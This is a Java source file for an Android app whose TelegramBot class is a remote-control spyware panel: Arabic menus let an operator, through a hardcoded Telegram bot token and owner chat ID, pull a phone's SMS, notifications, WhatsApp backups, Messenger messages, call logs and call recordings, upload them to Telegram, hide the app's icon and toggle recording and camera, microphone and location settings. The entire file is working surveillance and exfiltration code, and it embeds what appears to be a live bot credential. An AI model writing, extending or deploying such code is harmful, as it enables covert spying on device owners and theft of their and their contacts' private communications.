package com.alzahra.bot;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.StatFs;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.alzahra.collector.CallLogCollector;
import com.alzahra.collector.ContactsCollector;
import com.alzahra.collector.NotificationCollector;
import com.alzahra.collector.SMSCollector;
import com.alzahra.collector.WhatsAppCollector;
import com.alzahra.collector.MessengerCollector;
import com.alzahra.collector.RecordingsCollector;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static final String API_BASE = "https://api.telegram.org/bot%s/%s";
    private static final String BOT_TOKEN = "8767989892:AAFCB-gylVjbrB0X6gk95G8rCn6_ds5e9As";
    private static final String OWNER_CHAT_ID = "7344776596";

    private final Context context;
    private final SharedPreferences prefs;
    private final Handler mainHandler;
    private final ExecutorService executor;
    private final AtomicBoolean running = new AtomicBoolean(false);
    private final AtomicLong lastUpdateId = new AtomicLong(0);

    // Collectors
    private SMSCollector smsCollector;
    private CallLogCollector callLogCollector;
    private ContactsCollector contactsCollector;
    private NotificationCollector notificationCollector;
    private WhatsAppCollector whatsAppCollector;
    private MessengerCollector messengerCollector;
    private RecordingsCollector recordingsCollector;

    public interface CommandListener {
        void onCommand(String command);
    }
    private CommandListener commandListener;

    public TelegramBot(Context context) {
        this.context = context.getApplicationContext();
        this.prefs = context.getSharedPreferences("alzahra_prefs", Context.MODE_PRIVATE);
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.executor = Executors.newFixedThreadPool(4);

        this.smsCollector = new SMSCollector(context);
        this.callLogCollector = new CallLogCollector(context);
        this.contactsCollector = new ContactsCollector(context);
        this.notificationCollector = new NotificationCollector(context);
        this.whatsAppCollector = new WhatsAppCollector(context);
        this.messengerCollector = new MessengerCollector(context);
        this.recordingsCollector = new RecordingsCollector(context);
    }

    public void setCommandListener(CommandListener listener) {
        this.commandListener = listener;
    }

    public void start() {
        if (running.get()) return;
        running.set(true);
        Log.d(TAG, "Bot started");
        sendMainMenu();
        startPolling();
    }

    public void stop() {
        running.set(false);
        executor.shutdownNow();
    }

    public boolean isRunning() { return running.get(); }

    // ═══════════════════════════════════════════
    // Polling
    // ═══════════════════════════════════════════
    private void startPolling() {
        executor.execute(() -> {
            while (running.get()) {
                try {
                    pollOnce();
                    Thread.sleep(2000);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                } catch (Exception e) {
                    Log.e(TAG, "Polling error: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ie) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
        });
    }

    private void pollOnce() {
        try {
            String url = String.format(API_BASE, BOT_TOKEN, "getUpdates") +
                "?offset=" + (lastUpdateId.get() + 1) + "&limit=10&timeout=15";
            String response = httpGet(url);
            if (response == null) return;
            JSONObject json = new JSONObject(response);
            if (!json.optBoolean("ok", false)) return;
            JSONArray results = json.optJSONArray("result");
            if (results == null) return;
            for (int i = 0; i < results.length(); i++) {
                JSONObject update = results.getJSONObject(i);
                long updateId = update.optLong("update_id", 0);
                lastUpdateId.set(Math.max(lastUpdateId.get(), updateId));
                processUpdate(update);
            }
        } catch (Exception e) {
            Log.e(TAG, "Poll error: " + e.getMessage());
        }
    }

    private void processUpdate(JSONObject update) {
        try {
            String command = null;
            String callbackData = null;

            if (update.has("message")) {
                JSONObject message = update.getJSONObject("message");
                if (message.has("text")) {
                    String chatId = String.valueOf(message.getJSONObject("chat").getLong("id"));
                    if (chatId.equals(OWNER_CHAT_ID)) {
                        command = message.getString("text").trim();
                    } else {
                        sendToOwner("⛔ وصول غير مصرح من: " + chatId);
                    }
                }
            } else if (update.has("callback_query")) {
                JSONObject cb = update.getJSONObject("callback_query");
                String chatId = String.valueOf(cb.getJSONObject("message").getJSONObject("chat").getLong("id"));
                if (chatId.equals(OWNER_CHAT_ID)) {
                    callbackData = cb.getString("data").trim();
                    // Answer callback to remove loading
                    answerCallbackQuery(cb.getString("id"));
                }
            }

            if (callbackData != null) {
                handleCallback(callbackData);
            } else if (command != null) {
                handleCommand(command);
            }
        } catch (Exception e) {
            Log.e(TAG, "Process update error", e);
        }
    }

    private void answerCallbackQuery(String callbackQueryId) {
        executor.execute(() -> {
            try {
                String urlStr = String.format(API_BASE, BOT_TOKEN, "answerCallbackQuery");
                String postData = "callback_query_id=" + URLEncoder.encode(callbackQueryId, "UTF-8");
                httpPost(urlStr, postData);
            } catch (Exception e) {
                Log.e(TAG, "Answer callback error", e);
            }
        });
    }

    // ═══════════════════════════════════════════
    // Main Menu
    // ═══════════════════════════════════════════
    private void sendMainMenu() {
        String text = "🎛️ *لوحة تحكم Al-Zahra*\n\n" +
            "📱 الجهاز: " + Build.MODEL + "\n" +
            "🤖 أندرويد: " + Build.VERSION.RELEASE + "\n" +
            "⏰ " + getTimestamp() + "\n\n" +
            "اختر الجهاز أو الإعدادات:";

        String keyboard = "{\"inline_keyboard\":[" +
            "[{\"text\":\"📱 الجهاز المتصل\",\"callback_data\":\"device_main\"}]," +
            "[{\"text\":\"⚙️ الإعدادات\",\"callback_data\":\"settings_main\"}]" +
            "]}";

        sendRaw("sendMessage", "chat_id", OWNER_CHAT_ID,
            "text", text, "parse_mode", "Markdown", "reply_markup", keyboard);
    }

    // ═══════════════════════════════════════════
    // Device Main Menu
    // ═══════════════════════════════════════════
    private void sendDeviceMainMenu() {
        String text = "📱 *بيانات الجهاز*\n\n" +
            "📱 " + Build.MODEL + "\n" +
            "🤖 Android " + Build.VERSION.RELEASE + "\n\n" +
            "اختر نوع البيانات:";

        String keyboard = "{\"inline_keyboard\":[" +
            // Row 1: SMS
            "[{\"text\":\"📨 سحب SMS\",\"callback_data\":\"get_sms\"}]," +
            // Row 2: Notifications
            "[{\"text\":\"🔔 سحب الإشعارات\",\"callback_data\":\"get_notifications\"}]," +
            // Row 3: WhatsApp
            "[{\"text\":\"💬 سحب واتساب\",\"callback_data\":\"get_whatsapp\"}]," +
            // Row 4: Messenger
            "[{\"text\":\"📩 سحب ماسنجر\",\"callback_data\":\"get_messenger\"}]," +
            // Row 5: Call Logs
            "[{\"text\":\"📞 سجل المكالمات\",\"callback_data\":\"get_calls\"}]," +
            // Row 6: Info
            "[{\"text\":\"ℹ️ معلومات عامة\",\"callback_data\":\"get_info\"}]," +
            // Row 7: Recordings
            "[{\"text\":\"🎙️ المكالمات المسجلة\",\"callback_data\":\"get_recordings\"}]," +
            // Row 8: Back
            "[{\"text\":\"🔙 رجوع\",\"callback_data\":\"back_main\"}]" +
            "]}";

        sendRaw("editMessageText", "chat_id", OWNER_CHAT_ID,
            "message_id", String.valueOf(getLastMessageId()),
            "text", text, "parse_mode", "Markdown", "reply_markup", keyboard);
    }

    // ═══════════════════════════════════════════
    // Settings Menu
    // ═══════════════════════════════════════════
    private void sendSettingsMenu() {
        boolean isHidden = prefs.getBoolean("app_hidden", false);
        boolean isRecording = prefs.getBoolean("call_recording", true);

        String text = "⚙️ *الإعدادات*\n\n" +
            "🔒 إخفاء التطبيق: " + (isHidden ? "مفعّل ✅" : "معطّل ❌") + "\n" +
            "🎙️ تسجيل المكالمات: " + (isRecording ? "مفعّل ✅" : "معطّل ❌") + "\n\n" +
            "اختر الإعداد:";

        String keyboard = "{\"inline_keyboard\":[" +
            // Row 1: Permissions
            "[{\"text\":\"🔐 التحكم بالصلاحيات\",\"callback_data\":\"settings_permissions\"}]," +
            // Row 2: Hide/Unhide
            "[{\"text\":\"🔒 إخفاء التطبيق\",\"callback_data\":\"cmd_hide\"},{\"text\":\"🔓 إظهار التطبيق\",\"callback_data\":\"cmd_unhide\"}]," +
            // Row 3: Recording
            "[{\"text\":\"🎙️ تفعيل التسجيل\",\"callback_data\":\"cmd_record_on\"},{\"text\":\"⏹️ إيقاف التسجيل\",\"callback_data\":\"cmd_record_off\"}]," +
            // Row 4: Back
            "[{\"text\":\"🔙 رجوع\",\"callback_data\":\"back_main\"}]" +
            "]}";

        sendRaw("editMessageText", "chat_id", OWNER_CHAT_ID,
            "message_id", String.valueOf(getLastMessageId()),
            "text", text, "parse_mode", "Markdown", "reply_markup", keyboard);
    }

    // ═══════════════════════════════════════════
    // Permissions Menu
    // ═══════════════════════════════════════════
    private void sendPermissionsMenu() {
        String text = "🔐 *التحكم بالصلاحيات*\n\n" +
            "يمكنك تفعيل أو تعطيل الصلاحيات عن بُعد:";

        String keyboard = "{\"inline_keyboard\":[" +
            "[{\"text\":\"📨 تفعيل SMS\",\"callback_data\":\"perm_sms_on\"},{\"text\":\"📨 تعطيل SMS\",\"callback_data\":\"perm_sms_off\"}]," +
            "[{\"text\":\"📞 تفعيل المكالمات\",\"callback_data\":\"perm_calls_on\"},{\"text\":\"📞 تعطيل المكالمات\",\"callback_data\":\"perm_calls_off\"}]," +
            "[{\"text\":\"📍 تفعيل الموقع\",\"callback_data\":\"perm_location_on\"},{\"text\":\"📍 تعطيل الموقع\",\"callback_data\":\"perm_location_off\"}]," +
            "[{\"text\":\"📷 تفعيل الكاميرا\",\"callback_data\":\"perm_camera_on\"},{\"text\":\"📷 تعطيل الكاميرا\",\"callback_data\":\"perm_camera_off\"}]," +
            "[{\"text\":\"🎙️ تفعيل الميكروفون\",\"callback_data\":\"perm_mic_on\"},{\"text\":\"🎙️ تعطيل الميكروفون\",\"callback_data\":\"perm_mic_off\"}]," +
            "[{\"text\":\"🔙 رجوع\",\"callback_data\":\"settings_main\"}]" +
            "]}";

        sendRaw("editMessageText", "chat_id", OWNER_CHAT_ID,
            "message_id", String.valueOf(getLastMessageId()),
            "text", text, "parse_mode", "Markdown", "reply_markup", keyboard);
    }

    // ═══════════════════════════════════════════
    // Handle Callbacks
    // ═══════════════════════════════════════════
    private void handleCallback(String data) {
        Log.d(TAG, "Callback: " + data);

        switch (data) {
            // Navigation
            case "back_main":
                sendMainMenu();
                break;
            case "device_main":
                sendDeviceMainMenu();
                break;
            case "settings_main":
                sendSettingsMenu();
                break;
            case "settings_permissions":
                sendPermissionsMenu();
                break;

            // Data Collection
            case "get_sms":
                handleGetSMS();
                break;
            case "get_notifications":
                handleGetNotifications();
                break;
            case "get_whatsapp":
                handleGetWhatsApp();
                break;
            case "get_messenger":
                handleGetMessenger();
                break;
            case "get_calls":
                handleGetCalls();
                break;
            case "get_info":
                handleGetInfo();
                break;
            case "get_recordings":
                handleGetRecordings();
                break;

            // Commands
            case "cmd_hide":
                handleHideApp();
                break;
            case "cmd_unhide":
                handleUnhideApp();
                break;
            case "cmd_record_on":
                handleRecordOn();
                break;
            case "cmd_record_off":
                handleRecordOff();
                break;

            // Permissions
            case "perm_sms_on":
                handlePermissionChange("sms", true);
                break;
            case "perm_sms_off":
                handlePermissionChange("sms", false);
                break;
            case "perm_calls_on":
                handlePermissionChange("calls", true);
                break;
            case "perm_calls_off":
                handlePermissionChange("calls", false);
                break;
            case "perm_location_on":
                handlePermissionChange("location", true);
                break;
            case "perm_location_off":
                handlePermissionChange("location", false);
                break;
            case "perm_camera_on":
                handlePermissionChange("camera", true);
                break;
            case "perm_camera_off":
                handlePermissionChange("camera", false);
                break;
            case "perm_mic_on":
                handlePermissionChange("mic", true);
                break;
            case "perm_mic_off":
                handlePermissionChange("mic", false);
                break;

            default:
                sendToOwner("❓ أمر غير معروف: " + data);
                break;
        }
    }

    // ═══════════════════════════════════════════
    // Handle Commands
    // ═══════════════════════════════════════════
    private void handleCommand(String cmd) {
        if (commandListener != null) {
            mainHandler.post(() -> commandListener.onCommand(cmd));
        }

        String lower = cmd.toLowerCase();
        if (lower.equals("/start") || lower.equals("/help")) {
            sendMainMenu();
        } else {
            sendToOwner("❓ أمر غير معروف. استخدم /start للقائمة الرئيسية");
        }
    }

    // ═══════════════════════════════════════════
    // Data Handlers
    // ═══════════════════════════════════════════
    private void handleGetSMS() {
        executor.execute(() -> {
            sendToOwner("⏳ جاري جمع رسائل SMS...");
            try {
                File file = smsCollector.export();
                if (file != null) {
                    sendDocument(file, "📨 رسائل SMS\n📅 " + getTimestamp());
                } else {
                    sendToOwner("❌ لا توجد رسائل SMS");
                }
            } catch (Exception e) {
                sendToOwner("❌ خطأ: " + e.getMessage());
            }
        });
    }

    private void handleGetNotifications() {
        executor.execute(() -> {
            sendToOwner("⏳ جاري جمع الإشعارات...");
            try {
                File file = notificationCollector.export();
                if (file != null) {
                    sendDocument(file, "🔔 الإشعارات\n📅 " + getTimestamp());
                } else {
                    sendToOwner("❌ لا توجد إشعارات مخزنة");
                }
            } catch (Exception e) {
                sendToOwner("❌ خطأ: " + e.getMessage());
            }
        });
    }

    private void handleGetWhatsApp() {
        executor.execute(() -> {
            sendToOwner("⏳ جاري جمع بيانات واتساب...");
            try {
                // Get WhatsApp backup files
                File backupDir = new File("/sdcard/Android/media/com.whatsapp/WhatsApp/Databases");
                if (backupDir.exists() && backupDir.listFiles() != null) {
                    File[] files = backupDir.listFiles();
                    if (files != null && files.length > 0) {
                        // Send the most recent backup
                        File latest = files[0];
                        for (File f : files) {
                            if (f.lastModified() > latest.lastModified()) {
                                latest = f;
                            }
                        }
                        sendDocument(latest, "💬 نسخة واتساب الاحتياطية\n📅 " + getTimestamp());
                    } else {
                        sendToOwner("❌ لا توجد نسخ احتياطية لواتساب");
                    }
                } else {
                    sendToOwner("❌ مجلد واتساب غير موجود");
                }

                // Also send WhatsApp notifications from app storage
                File notifFile = new File(context.getFilesDir(), "whatsapp_notifications.json");
                if (notifFile.exists()) {
                    sendDocument(notifFile, "💬 إشعارات واتساب\n📅 " + getTimestamp());
                }
            } catch (Exception e) {
                sendToOwner("❌ خطأ: " + e.getMessage());
            }
        });
    }

    private void handleGetMessenger() {
        executor.execute(() -> {
            sendToOwner("⏳ جاري جمع رسائل ماسنجر...");
            try {
                File file = messengerCollector.export();
                if (file != null) {
                    sendDocument(file, "📩 رسائل ماسنجر\n📅 " + getTimestamp());
                } else {
                    sendToOwner("❌ لا توجد رسائل ماسنجر مخزنة");
                }
            } catch (Exception e) {
                sendToOwner("❌ خطأ: " + e.getMessage());
            }
        });
    }

    private void handleGetCalls() {
        executor.execute(() -> {
            sendToOwner("⏳ جاري جمع سجل المكالمات...");
            try {
                File file = callLogCollector.export();
                if (file != null) {
                    sendDocument(file, "📞 سجل المكالمات\n📅 " + getTimestamp());
                } else {
                    sendToOwner("❌ لا توجد مكالمات");
                }
            } catch (Exception e) {
                sendToOwner("❌ خطأ: " + e.getMessage());
            }
        });
    }

    private void handleGetInfo() {
        executor.execute(() -> {
            try {
                JSONObject info = new JSONObject();
                info.put("model", Build.MODEL);
                info.put("manufacturer", Build.MANUFACTURER);
                info.put("android", Build.VERSION.RELEASE);
                info.put("sdk", Build.VERSION.SDK_INT);
                info.put("hardware", Build.HARDWARE);
                info.put("device", Build.DEVICE);
                info.put("product", Build.PRODUCT);
                info.put("brand", Build.BRAND);

                // Battery
                android.content.Intent battery = context.registerReceiver(null,
                    new android.content.IntentFilter(android.content.Intent.ACTION_BATTERY_CHANGED));
                if (battery != null) {
                    int level = battery.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int scale = battery.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                    if (scale > 0) {
                        info.put("battery", Math.round(level * 100f / scale) + "%");
                    }
                    int status = battery.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                    info.put("charging", status == BatteryManager.BATTERY_STATUS_CHARGING ||
                        status == BatteryManager.BATTERY_STATUS_FULL);
                }

                // Storage
                StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
                long totalBytes = (long) stat.getBlockCount() * stat.getBlockSize();
                long freeBytes = (long) stat.getAvailableBlocks() * stat.getBlockSize();
                info.put("storage_total", formatSize(totalBytes));
                info.put("storage_free", formatSize(freeBytes));
                info.put("storage_used", formatSize(totalBytes - freeBytes));

                info.put("timestamp", getTimestamp());

                sendToOwner("📱 *معلومات الجهاز*\n```json\n" + info.toString(2) + "\n```");
            } catch (Exception e) {
                sendToOwner("❌ خطأ: " + e.getMessage());
            }
        });
    }

    private void handleGetRecordings() {
        executor.execute(() -> {
            sendToOwner("⏳ جاري جمع المكالمات المسجلة...");
            try {
                File dir = new File(context.getFilesDir(), "recordings");
                if (dir.exists() && dir.listFiles() != null) {
                    File[] files = dir.listFiles();
                    if (files != null && files.length > 0) {
                        for (File file : files) {
                            sendDocument(file, "🎙️ تسجيل مكالمة\n📅 " + getTimestamp());
                        }
                    } else {
                        sendToOwner("❌ لا توجد تسجيلات");
                    }
                } else {
                    sendToOwner("❌ لا توجد تسجيلات");
                }
            } catch (Exception e) {
                sendToOwner("❌ خطأ: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════
    // Settings Handlers
    // ═══════════════════════════════════════════
    private void handleHideApp() {
        prefs.edit().putBoolean("app_hidden", true).apply();
        if (commandListener != null) {
            mainHandler.post(() -> commandListener.onCommand("CMD_HIDE"));
        }
        sendToOwner("🔒 تم إخفاء التطبيق بنجاح");
        sendSettingsMenu();
    }

    private void handleUnhideApp() {
        prefs.edit().putBoolean("app_hidden", false).apply();
        if (commandListener != null) {
            mainHandler.post(() -> commandListener.onCommand("CMD_UNHIDE"));
        }
        sendToOwner("🔓 تم إظهار التطبيق بنجاح");
        sendSettingsMenu();
    }

    private void handleRecordOn() {
        prefs.edit().putBoolean("call_recording", true).apply();
        sendToOwner("🎙️ تم تفعيل تسجيل المكالمات");
        sendSettingsMenu();
    }

    private void handleRecordOff() {
        prefs.edit().putBoolean("call_recording", false).apply();
        sendToOwner("⏹️ تم إيقاف تسجيل المكالمات");
        sendSettingsMenu();
    }

    private void handlePermissionChange(String perm, boolean enable) {
        prefs.edit().putBoolean("perm_" + perm, enable).apply();
        sendToOwner((enable ? "✅ تم تفعيل" : "❌ تم تعطيل") + " صلاحية " + perm);
        sendPermissionsMenu();
    }

    // ═══════════════════════════════════════════
    // Public API
    // ═══════════════════════════════════════════
    public void sendToOwner(String text) {
        sendRaw("sendMessage", "chat_id", OWNER_CHAT_ID, "text", text, "parse_mode", "Markdown");
    }

    public void sendDocument(File file, String caption) {
        if (file == null || !file.exists()) {
            sendToOwner("❌ الملف غير موجود");
            return;
        }
        executor.execute(() -> {
            try {
                String boundary = "----AlZahraBoundary" + System.currentTimeMillis();
                String lineEnd = "\r\n";
                URL url = new URL(String.format(API_BASE, BOT_TOKEN, "sendDocument"));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setUseCaches(false);
                conn.setDoOutput(true);
                conn.setDoInput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(60000);
                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                writeFormField(dos, boundary, lineEnd, "chat_id", OWNER_CHAT_ID);
                writeFormField(dos, boundary, lineEnd, "caption", caption);
                writeFormField(dos, boundary, lineEnd, "parse_mode", "Markdown");
                writeFileField(dos, boundary, lineEnd, "document", file.getName(), file);
                dos.writeBytes("--" + boundary + "--" + lineEnd);
                dos.flush();
                dos.close();
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Upload error", e);
                sendToOwner("❌ خطأ رفع: " + e.getMessage());
            }
        });
    }

    // ═══════════════════════════════════════════
    // HTTP Helpers
    // ═══════════════════════════════════════════
    private void sendRaw(String method, String... params) {
        executor.execute(() -> {
            try {
                String urlStr = String.format(API_BASE, BOT_TOKEN, method);
                if ("getUpdates".equals(method)) {
                    StringBuilder sb = new StringBuilder(urlStr);
                    for (int i = 0; i < params.length; i += 2) {
                        sb.append(i == 0 ? "?" : "&");
                        sb.append(URLEncoder.encode(params[i], "UTF-8")).append("=");
                        if (i + 1 < params.length) sb.append(URLEncoder.encode(params[i + 1], "UTF-8"));
                    }
                    httpGet(sb.toString());
                } else {
                    StringBuilder postData = new StringBuilder();
                    for (int i = 0; i < params.length; i += 2) {
                        if (i > 0) postData.append("&");
                        postData.append(URLEncoder.encode(params[i], "UTF-8")).append("=");
                        if (i + 1 < params.length) postData.append(URLEncoder.encode(params[i + 1], "UTF-8"));
                    }
                    httpPost(urlStr, postData.toString());
                }
            } catch (Exception e) {
                Log.e(TAG, "Send raw error", e);
            }
        });
    }

    private String httpGet(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(20000);
            conn.setReadTimeout(20000);
            int code = conn.getResponseCode();
            if (code != 200) { conn.disconnect(); return null; }
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private String httpPost(String urlStr, String data) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.getOutputStream().write(data.getBytes("UTF-8"));
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) { return null; }
    }

    private void writeFormField(DataOutputStream dos, String boundary, String lineEnd, String name, String value) throws Exception {
        dos.writeBytes("--" + boundary + lineEnd);
        dos.writeBytes("Content-Disposition: form-data; name=\"" + name + "\"" + lineEnd);
        dos.writeBytes(lineEnd);
        dos.writeBytes(value + lineEnd);
    }

    private void writeFileField(DataOutputStream dos, String boundary, String lineEnd, String fieldName, String fileName, File file) throws Exception {
        dos.writeBytes("--" + boundary + lineEnd);
        dos.writeBytes("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + fileName + "\"" + lineEnd);
        dos.writeBytes("Content-Type: application/octet-stream" + lineEnd);
        dos.writeBytes(lineEnd);
        FileInputStream fis = new FileInputStream(file);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) dos.write(buffer, 0, bytesRead);
        fis.close();
        dos.writeBytes(lineEnd);
    }

    // ═══════════════════════════════════════════
    // Helpers
    // ═══════════════════════════════════════════
    private long getLastMessageId() {
        return prefs.getLong("last_message_id", 0);
    }

    private String getTimestamp() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
    }

    private String formatSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return String.format(Locale.US, "%.1f KB", bytes / 1024.0);
        if (bytes < 1024 * 1024 * 1024) return String.format(Locale.US, "%.1f MB", bytes / (1024.0 * 1024));
        return String.format(Locale.US, "%.1f GB", bytes / (1024.0 * 1024 * 1024));
    }
}
